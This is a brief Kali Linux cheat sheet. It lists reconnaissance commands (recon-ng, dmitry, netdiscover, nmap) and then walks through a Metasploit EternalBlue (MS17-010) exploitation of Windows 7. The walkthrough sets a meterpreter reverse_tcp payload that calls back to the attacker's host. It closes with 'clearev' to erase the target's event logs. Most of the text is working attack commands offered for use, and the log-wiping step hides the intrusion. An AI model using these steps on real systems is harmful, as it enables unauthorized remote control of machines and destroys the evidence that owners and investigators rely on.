## Kali Linux
### Information Gathering and Reconnaissance
#### Use Recon-NG Framework:
```
> recon-ng
> show modules
> use module-name
```
#### Use Dmitry
```
> dmitry -s site.com
```
#### Use Netdiscover to find IPs and open ports on LAN
```
> netdiscover
```
#### Use Nmap
```
> nmap -v -A site.com
```
Find open ports:
```
> nmap -r -v 192.168.1.5
```
Find what services are running on open ports:
```
> nmap -sS -Pn -A 192.168.1.5
```
#### Use Metasploit for Pintesting Windows 7
Get open ports
```
> nmap -sS -sV put-target-ip-here-or-a-range -A -O -v
> msfconsole
  // use MS17010 for Windows 7 
> search MS17-010
> use exploit/windows/smb/ms_17_010_eternalblue
  // or
> use exploit/windows/smb/ms17_010_psexec
> show payloads
> set payload windows/x64/meterpreter/reverse_tcp
> show options
> set LHOST put-your-ip-here
> set LPORT 4444
> set RHOST put-target-ip-here
> set RPORT 445
> exploit
```
if you get meterpriter bash, it means you are in the target file sistem. Use mterpreter commands to navigate around.

To clear logs on the target system (via meterpreter):
```
> clearev (clear log)
```
